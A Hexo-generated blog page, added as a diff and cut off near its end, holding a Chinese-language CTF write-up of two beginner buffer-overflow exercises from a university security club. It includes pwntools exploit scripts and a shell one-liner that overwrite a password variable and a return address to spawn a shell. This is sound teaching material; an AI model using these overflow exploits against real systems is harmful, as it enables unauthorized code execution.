@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-tail.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-tail.png">
+  <link rel="mask-icon" href="/images/tail.svg" color="#222">
+  <meta name="google-site-verification" content="5POakq1iR3soBgSPJX__DRW6QXkfxgZV9yNcnWQ95j0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yctseng1227.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文… 先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考 另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn否則每次被問到我也不曉得怎麼解釋（抹臉 不會解釋資安… 應該是我的問題才對Orz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="資安社課 Pwn basic(1)">
+<meta property="og:url" content="https://yctseng1227.github.io/2020/03/22/200320-nsysuisc-pwn-1/index.html">
+<meta property="og:site_name" content="yctseng&#39;s Blog">
+<meta property="og:description" content="經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文… 先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考 另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn否則每次被問到我也不曉得怎麼解釋（抹臉 不會解釋資安… 應該是我的問題才對Orz">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-TcQ7Mhh/0/6d3aacdf/S/i-TcQ7Mhh-S.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-jQZg5kx/0/f2aef2a7/S/i-jQZg5kx-S.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-vmX8nT2/0/b97de34e/S/i-vmX8nT2-S.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-nWpmnNR/0/654a0485/S/i-nWpmnNR-S.png">
+<meta property="article:published_time" content="2020-03-22T02:45:23.000Z">
+<meta property="article:modified_time" content="2020-08-05T03:29:40.000Z">
+<meta property="article:author" content="yctseng">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn Challenge">
+<meta property="article:tag" content="NSYSUISC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://photos.smugmug.com/photos/i-TcQ7Mhh/0/6d3aacdf/S/i-TcQ7Mhh-S.png">
+
+<link rel="canonical" href="https://yctseng1227.github.io/2020/03/22/200320-nsysuisc-pwn-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-TW'
+  };
+</script>
+
+  <title>資安社課 Pwn basic(1) | yctseng's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-137531005-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-137531005-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yctseng's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">課金一瞬 嫁一生</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類<span class="badge">8</span></a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>標籤<span class="badge">25</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章<span class="badge">29</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜尋
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜尋..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://yctseng1227.github.io/2020/03/22/200320-nsysuisc-pwn-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/yctseng.png">
+      <meta itemprop="name" content="yctseng">
+      <meta itemprop="description" content="競程廢物、資安菜鳥 >_<">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yctseng's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          資安社課 Pwn basic(1)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+
+              <time title="創建時間：2020-03-22 2020-03-22T10:45:23+08:00" itemprop="dateCreated datePublished" datetime="2020-03-22T10:45:23+08:00">2020-03-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分類於</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="閱讀次數" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">閱讀次數：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="文章字數">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">文章字數：</span>
+              <span>5.1k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D<br>原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文…</p>
+<p>先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手<br>一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考</p>
+<p>另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn<br>否則每次被問到我也不曉得怎麼解釋（抹臉</p>
+<p>不會解釋資安… 應該是我的問題才對Orz</p>
+<a id="more"></a>
+
+<p>“<strong>Pwn</strong>“，有人唸Costco、有人唸IKEA，總之我都唸 “胖” 或是 “碰” 。<br>常見做法就是針對程式內的漏洞進行攻擊(提權)，有種”<strong>player has been owned.</strong>“的意思！<br>也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺w<br>在CTF領域，Pwn基礎題通常是給你無權讀取的文字檔(flag)，希望你透過程式漏洞拿到root權限拿flag。</p>
+<p>平常剛拿到題目比較會用到的幾個指令(以我來說)</p>
+<ul>
+<li><code>ls -al</code> 瞭解目錄下的檔案以及執行權限</li>
+<li><code>file</code> 確認檔案類型以及位元數</li>
+<li><code>checksec</code> 查看該ELF檔開啟了哪些保護機制</li>
+</ul>
+<br>
+那接下來就開始解題囉！ovo
+<br>
+
+<h2 id="0x01-password"><a href="#0x01-password" class="headerlink" title="0x01: password"></a>0x01: password</h2><p>首先，來看一下這題提供的檔案。</p>
+<blockquote>
+<p>password<br>password.c<br>flag.txt</p>
+</blockquote>
+<p>第一個檔案<code>password</code>用<code>file</code>指令可以查看關於password的檔案類型。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./password</span></span><br><span class="line">password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>可以發現是屬於Linux OS底下的ELF執行檔，也是CTF內最常見的檔案類型，不過用MacOS的Safari載下來都會莫名被加上<code>.dms</code>，當時第一次看到還在思考檔案是不是壞了XD（用<code>file</code>查看是沒有問題），另外社課提供的Pwn基礎題以<code>32-bits</code>為主，據說是比較好拿來練習(?)</p>
+<p>再來就是直接執行看看… 咦？不能執行？</p>
+<p>用<code>ls</code>發現這個檔案並沒有執行權限，可以用<code>chmod</code>改檔案權限<br>對其他細節有興趣的可以去Google <strong>鳥哥私房菜</strong> 瞭解一下<code>Linux的檔案權限與目錄配置</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">-rw-r-xr-x@ [other information] password</span><br><span class="line">$ chmod +x .&#x2F;password</span><br><span class="line">$ ls -al</span><br><span class="line">-rwxr-xr-x@ [other information] password</span><br></pre></td></tr></table></figure>
+
+<p>修改完執行權限後可以先run一下看看程式大概要幹嘛。<br>在Pwn基礎題通常會刻意把一些<strong>防範機制</strong>關掉，可以拿<code>checksec</code>指令看看該執行檔開了哪些保護，以password這題來說。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec ./password</span></span><br></pre></td></tr></table></figure>
+<div class="note info">
+            <pre>Arch:     i386-32-little<br>RELRO:    <font color='EAC100'>Partial RELRO</font><br>Stack:    <font color='FF0000'>No canary found</font><br>NX:       <font color='009100'>NX enabled</font><br>PIE:      <font color='FF0000'>No PIE (0x8048000)</font><br></pre>
+          </div>
+
+<p>第一次見到這些保護機制不懂也很正常：）<br>白話來說就是</p>
+<ol>
+<li><code>RELRO</code>暫時還不會用到，主要適用於<strong>防範lazy Binding</strong>所造成的延伸問題</li>
+<li><code>canary</code>關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是能Buffer Overflow</li>
+<li><code>NX</code>開啟表示不讓你塞些邪惡的command在程式內執行，之後也會有這部分的練習</li>
+<li><code>PIE</code>關閉讓你分析執行檔時看到的會是”絕對位址”，若開啟就只看得到位址偏移量不容易拿來利用<br>（另外還有一個沒出現在<code>checksec</code>的<code>ASLR</code>，主要是對於每次執行stack、heap…的位址隨機化）</li>
+</ol>
+<p>之後根據社課這部分內容應該會再講詳細點，剛開始大概有個認知就行了。<br>然後，社課的基礎題還順便附了該執行程式的原始碼，佛心講師╭(⊙Д⊙)╯佛心講師╭(⊙Д⊙)╯</p>
+<figure class="highlight c"><figcaption><span>password.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">12</span>] = <span class="string">&quot;12345678&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">&quot;password&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome :) &quot;</span>);</span><br><span class="line">        shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;QQ %s\n&quot;</span>, password);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這段code對於有寫過程式的難民們(?)應該都不困難<br>題意要求輸入<code>name</code>，然後會拿變數<code>password</code>和”password”進行比較，判斷式成立就能執行<code>shell()</code><br>可以發現code中並沒有任何要求輸入變數<code>password</code>，只有在最後會輸出”QQ <code>password</code>“<br>若第一次接觸Pwn的看到這奇怪的判斷式應該會滿頭問號（笑）</p>
+<p>不過，我們可以先隨便輸入一些東西觀察看看<br>像是變數<code>name</code>大小為 8 bytes，輸入8字元”12345678”，會得到下面結果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What&#39;s your name? 12345678</span><br><span class="line">Hello 12345678</span><br><span class="line">QQ </span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>然而，如果輸入超過8個字元”1234567890”，會得到下列結果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What&#39;s your name? 1234567890</span><br><span class="line">Hello 1234567890</span><br><span class="line">QQ 90</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>嗯嗯？明明沒有對變數<code>password</code>輸入參數，但變數內容好像被偷改了XD</p>
+<p>沒錯！這題主要想表達的事情是</p>
+<blockquote>
+<p><code>gets()</code>這輸入函式是不安全的，因為它不會限制使用者的輸入長度<br>因此若在<strong>沒有canary的情況下</strong>很容易遭受<strong>Buffer Overflow</strong>攻擊</p>
+</blockquote>
+<p>以這題來說我們可以用反組譯指令<code>objdump</code>瞭解一下程式架構</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./password</span></span><br></pre></td></tr></table></figure>
+
+<p>Stack內容的部分畫成圖大概長得像這樣<br><img src="https://photos.smugmug.com/photos/i-TcQ7Mhh/0/6d3aacdf/S/i-TcQ7Mhh-S.png"></p>
+<p>我們這次輸入改成”aaaaaaaahaha”，”haha”就會蓋到變數<code>password</code>的值囉~<br><img src="https://photos.smugmug.com/photos/i-jQZg5kx/0/f2aef2a7/S/i-jQZg5kx-S.png"></p>
+<p>聰明的你應該知道怎麼做了吧 (｡･ω･｡)<br>沒有錯的啦！將上面的”haha”改成”password”就能啟動<code>shell()</code>拿到root權限了！</p>
+<p>話說回來<br>往後能夠透過手動輸入就破解的Pwn題並不常見<br>因此這類型的題目通常會搭配python套件<code>pwntool</code>進行exploit</p>
+<p>↓↓↓ 以這題來說用pwntool可以這樣寫 ↓↓↓</p>
+<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># process:本機連線, remote:遠端連線</span></span><br><span class="line">conn = process(<span class="string">&#x27;./password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根據程式內容設計輸入(payload)</span></span><br><span class="line">payload = <span class="string">&#x27;12345678password&#x27;</span></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 傳送給程式後, 由於會執行shell需要用interactive()進行互動</span></span><br><span class="line">conn.sendline(payload) </span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>光是第一題就打了落落長XD<br>打Pwn一開始抓不到感覺還蠻正常der<br>所以我用step by step的方式希望能詳細一點<br>順便幫自己補充平常不太會深入的知識ovo+</p>
+<p>再來就繼續囉！</p>
+<br>
+0x02: bof
+---
+
+<p>這題給的檔案有</p>
+<blockquote>
+<p>bof<br>bof.c<br>flag.txt</p>
+</blockquote>
+<p>同樣flag.txt沒有讀取權限，老樣子先來看看<code>bof</code>執行檔有開了哪些保護</p>
+<div class="note info">
+            <pre>Arch:     i386-32-little<br>RELRO:    <font color='EAC100'>Partial RELRO</font><br>Stack:    <font color='FF0000'>No canary found</font><br>NX:       <font color='009100'>NX enabled</font><br>PIE:      <font color='FF0000'>No PIE (0x8048000)</font><br></pre>
+          </div>
+
+<p>唔嗯… 可以發現和上一題形式上十分類似，再來看看<code>bof.c</code>原始碼的內容</p>
+<figure class="highlight c"><figcaption><span>bof.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整體結構看起來和上一題沒什麼差別，也都是針對<code>gets()</code>的危險漏洞。<br>只是這次… 完全沒辦法執行<code>shell()</code>啊!!!</p>
+<p>這題主要想表達的事情是</p>
+<blockquote>
+<p>利用<code>gets()</code>不限輸入長度的漏洞進行Buffer Overflow<br>而且要把<code>vuln()</code>原本要回到<code>main()</code>的return address改成<code>shell()</code>的address</p>
+</blockquote>
+<p>「… 殺小!? ・ ࡇ ・」<br>嗯嗯嗯 我相信有學過OS和ASM的人是不會講出上面那句話der<br>可是就算懂歸懂，要怎麼做呢???</p>
+<p>先拿<code>objdump</code>一樣來看看裡頭長什麼樣子</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./bof</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">080484eb &lt;shell&gt;:</span><br><span class="line"> 80484eb:    55                       push   ebp</span><br><span class="line"> 80484ec:    89 e5                    mov    ebp,esp</span><br><span class="line"> 80484ee:    68 e0 85 04 08           push   0x80485e0</span><br><span class="line"> 80484f3:    e8 b8 fe ff ff           call   80483b0 &lt;system@plt&gt;</span><br><span class="line"> 80484f8:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 80484fb:    90                       nop</span><br><span class="line"> 80484fc:    c9                       leave</span><br><span class="line"> 80484fd:    c3                       ret</span><br><span class="line"></span><br><span class="line">080484fe &lt;vuln&gt;:</span><br><span class="line"> 80484fe:    55                       push   ebp</span><br><span class="line"> 80484ff:    89 e5                    mov    ebp,esp</span><br><span class="line"> 8048501:    83 ec 30                 sub    esp,0x30</span><br><span class="line"> 8048504:    68 e8 85 04 08           push   0x80485e8</span><br><span class="line"> 8048509:    e8 82 fe ff ff           call   8048390 &lt;printf@plt&gt;</span><br><span class="line"> 804850e:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 8048511:    8d 45 d0                 lea    eax,[ebp-0x30]</span><br><span class="line"> 8048514:    50                       push   eax</span><br><span class="line"> 8048515:    e8 86 fe ff ff           call   80483a0 &lt;gets@plt&gt;</span><br><span class="line"> 804851a:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 804851d:    90                       nop</span><br><span class="line"> 804851e:    c9                       leave</span><br><span class="line"> 804851f:    c3                       ret</span><br></pre></td></tr></table></figure>
+
+<p>重點在line 18的<code>ebp-0x30</code>，必須要掌握變數所在的相對位置<br>把Stack frame畫成圖大概就是下面這樣：）<br><img src="https://photos.smugmug.com/photos/i-vmX8nT2/0/b97de34e/S/i-vmX8nT2-S.png"></p>
+<p>也就是說，這題希望我們除了把<code>str[48]</code>填滿<br>還要利用Buffer Overflow的方式把<code>shell()</code>的address蓋到return上。</p>
+<p>再來就是要知道line 1 <code>shell()</code>的function address<br>假如我們通通用”a”進行覆蓋，預期結果將會長這樣：）<br><img src="https://photos.smugmug.com/photos/i-nWpmnNR/0/654a0485/S/i-nWpmnNR-S.png"></p>
+<p>既然知道要怎麼蓋return address，剩下的就是寫payload了。</p>
+<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload分成三個部分: 填滿str[48], 覆蓋old ebp, 拿shell()覆蓋return address</span></span><br><span class="line"><span class="comment"># 要注意由於32位元是little-endian, 所以要用p32()轉成\xeb\x84\x04\x08的格式</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&#x27;aaaa&#x27;</span> + p32(<span class="number">0x080484eb</span>)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>這樣就能拿到root權限讀flag，當然如果懶得開檔案寫code，也是有一行流寫法XD</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (python -c <span class="string">&quot;print(&#x27;a&#x27;*48 + &#x27;a&#x27;*4 + &#x27;\xeb\x84\x04\x08&#x27;)&quot;</span>; cat) | ./bof</span></span><br></pre></td></tr></table></figure>
+
+
+
+<br>
+Pwn大概就是這麼一回事了~
+寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了(｡･ω･｡)
+
+<p>就醬，希望我還能繼續把題目補完（逃</p>
+
+    </div>
+
+    
+    
+    <div>
+    
+        <div style="width: 168px; margin: auto"><img src="/imges/end.png"></div>
+    
+</div>
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>作者： </strong>yctseng
+  </li>
+  <li class="post-copyright-link">
+    <strong>文章連結：</strong>
+    <a href="https://yctseng1227.github.io/2020/03/22/200320-nsysuisc-pwn-1/" title="資安社課 Pwn basic(1)">https://yctseng1227.github.io/2020/03/22/200320-nsysuisc-pwn-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版權聲明： </strong>本網誌所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-TW" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 許可協議。轉載請註明出處！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Pwn-Challenge/" rel="tag"># Pwn Challenge</a>
+              <a href="/tags/NSYSUISC/" rel="tag"># NSYSUISC</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/11/200311-lab-log-0x02/" rel="prev" title="實驗室日誌 0x02">
+      <i class="fa fa-chevron-left"></i> 實驗室日誌 0x02
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/13/200413-lab-log-0x03/" rel="next" title="實驗室日誌 0x03">
+      實驗室日誌 0x03 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
